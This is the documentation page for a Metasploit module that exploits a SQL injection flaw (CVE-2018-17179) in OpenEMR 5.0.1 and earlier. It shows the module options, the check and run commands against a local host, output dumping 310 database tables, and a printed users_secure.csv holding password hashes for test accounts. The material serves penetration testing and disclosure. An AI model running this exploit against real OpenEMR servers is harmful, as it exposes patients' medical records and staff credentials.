## Intro

This module exploits a SQLi vulnerability found in
OpenEMR version 5.0.1 Patch 6 and lower. The
vulnerability allows the contents of the entire
database (with exception of log and task tables) to be
extracted.

This module saves each table as a `.csv` file in your
loot directory and has been tested with
OpenEMR 5.0.1 (3).


## Author

Will Porter (will.porter@lodestonesecurity.com) from Lodestone Security


## References

https://www.cvedetails.com/cve/CVE-2018-17179/
https://github.com/openemr/openemr/commit/3e22d11c7175c1ebbf3d862545ce6fee18f70617


## Options

```
msf5 auxiliary(sqli/openemr/openemr_sqli_dump) > show options

Module options (auxiliary/sqli/openemr/openemr_sqli_dump):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /openemr         yes       The base path to the OpenEMR installation
   VHOST                       no        HTTP server virtual host
```

## Usage

This module has both `check` and `run` functions.

```
msf5 > use auxiliary/sqli/openemr/openemr_sqli_dump
msf5 auxiliary(sqli/openemr/openemr_sqli_dump) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf5 auxiliary(sqli/openemr/openemr_sqli_dump) > check

[*] Trying to detect installed version
[*] 127.0.0.1:80 - The target appears to be vulnerable.
msf5 auxiliary(sqli/openemr/openemr_sqli_dump) > run
[*] Running module against 127.0.0.1

[*] DB Version: 10.3.15-MariaDB-1
[*] Enumerating Tables, this may take a moment...
[*] Identified 310 tables.
[*] Created dump directory: /root/.msf4/loot/openemr-a323pl20
[*] Dumping table (1/310): ALL_PLUGINS
[*] Dumping table (2/310): APPLICABLE_ROLES
[*] Dumping table (3/310): CHARACTER_SETS
[*] Dumping table (4/310): CHECK_CONSTRAINTS
[*] Dumping table (5/310): COLLATIONS

...

[*] Dumping table (305/310): medex_recalls
[*] Dumping table (306/310): syndromic_surveillance
[*] Dumping table (307/310): lang_constants
[*] Dumping table (308/310): gacl_acl_seq
[*] Dumping table (309/310): background_services
[*] Dumping table (310/310): geo_country_reference
[*] Dumped all tables to /root/.msf4/loot/openemr-a323pl20
[*] Auxiliary module execution completed
msf5 auxiliary(sqli/openemr/openemr_sqli_dump) > exit

root@localhost:/tmp# cd /root/.msf4/loot/openemr-a323pl20
root@localhost:~/.msf4/loot/openemr-a323pl20# cat users_secure.csv
id,username,password,salt,last_update,password_history1,salt_history1,password_history2,salt_history2
1,admin,$2a$05$bxcQWy1ZeIwV2/ScGBQlTOeUVqJo9MdvHuF1mBs4Jo7H0/bFpZoPK,$2a$05$bxcQWy1ZeIwV2/ScGBQlTZ$,2019-08-27 20:07:13,"","","",""
4,johndoemsf,$2a$05$gUWCtnsoqPBbn5zKiasyaOphgJwkA9BySy7LnK3BswyWt0RrLb0Ma,$2a$05$gUWCtnsoqPBbn5zKiasyaQ$,2019-08-29 02:01:28,"","","",""
6,johnderp,$2a$05$nAHQ7japfATDqqgArPImlu5svMG79W1nj1SNBpE7xkEhS42.AvlWq,$2a$05$nAHQ7japfATDqqgArPImlv$,2019-08-29 02:02:32,"","","",""
7,janedoemsf,$2a$05$uv85uBLeAOWQWWl9hHGL0uUy1KZSTgNGbZfJ9o8Lg0ILuSeGCNDbm,$2a$05$uv85uBLeAOWQWWl9hHGL06$,2019-08-29 02:09:37,"","","",""
```
